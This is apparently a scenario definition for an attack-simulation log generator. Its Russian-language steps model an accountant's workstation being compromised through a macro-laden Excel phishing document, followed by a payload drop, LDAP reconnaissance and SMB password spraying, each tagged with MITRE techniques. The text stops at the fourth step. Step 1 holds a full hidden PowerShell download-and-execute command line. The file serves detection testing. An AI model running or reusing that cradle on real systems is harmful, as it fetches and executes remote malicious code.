name: "Phishing to Domain Controller Lateral Movement"
description: "Комплексный сценарий симуляции атаки (Initial Access -> Discovery -> Credential Access -> Lateral Movement -> Execution), моделирующий компрометацию рабочей станции бухгалтера через вредоносный документ Excel, сетевую разведку в Active Directory, подбор паролей к файловому серверу и боковое перемещение на контроллер домена с последующим закреплением и выполнением команд."
global_context:
host.name: "PC-Accountant"
host.domain: "corp.local.uz"
user.name: "a.karimova"
steps:
id: "step_1_initial_access_phishing"
template: "win_sysmon_1_process_creation"
description: "Первичный доступ: Пользователь запускает присланный по электронной почте вредоносный документ Excel (фишинг), в котором выполняется макрос VBA. Макрос инициирует дочерний процесс cmd.exe для выполнения скрытой команды PowerShell."
delay_from_prev: "0s"
fields:
host_name: "PC-Accountant"
host_ip: "192.168.100.23"
source_ip: "192.168.100.23"
user_name: "a.karimova"
process_name: "cmd.exe"
process_path: @"C:\Windows\System32\cmd.exe"
parent_process_name: "EXCEL.EXE"
parent_process_path: @"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
command_line: "cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.5/payload.ps1')""
mitre_technique: "T1566.001"
id: "step_2_payload_dropping"
template: "sysmon_event_11"
description: "Сохранение пейлоада: Процесс PowerShell сгружает на диск исполняемый файл вредоносного ПО в директорию временных файлов пользователя."
delay_from_prev: "15s"
depends_on: "step_1_initial_access_phishing"
fields:
host_name: "PC-Accountant"
host_ip: "192.168.100.23"
user_name: "a.karimova"
process_name: "powershell.exe"
process_path: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
target_filename: @"C:\Users\a.karimova\AppData\Local\Temp\net_updater.exe"
mitre_technique: "T1105"
id: "step_3_active_directory_recon"
template: "sysmon_event_3"
description: "Сетевая разведка (Discovery): Запущенный вредоносный модуль инициирует LDAP-запросы к контроллеру домена AD02 для перечисления доменных учетных записей, групп администраторов и сетевых ресурсов."
delay_from_prev: "45s"
depends_on: "step_2_payload_dropping"
fields:
host_name: "PC-Accountant"
host_ip: "192.168.100.23"
source_ip: "192.168.100.23"
destination_ip: "192.168.100.2"
destination_port: "389"
protocol: "tcp"
process_name: "net_updater.exe"
process_path: @"C:\Users\a.karimova\AppData\Local\Temp\net_updater.exe"
user_name: "a.karimova"
mitre_technique: "T1087.002"
id: "step_4_smb_bruteforce_attempt"
template: "win_security_4625"
description: "Получение учетных данных (Credential Access): Атакующий предпринимает серию неудачных попыток подбора пароля (Brute Force / Password Spraying) по протоколу SMB к файловому серверу FS01 с узла жертвы."
delay_from_prev: "2m"
depends_on: "step_3_active_directory_recon"
fields:
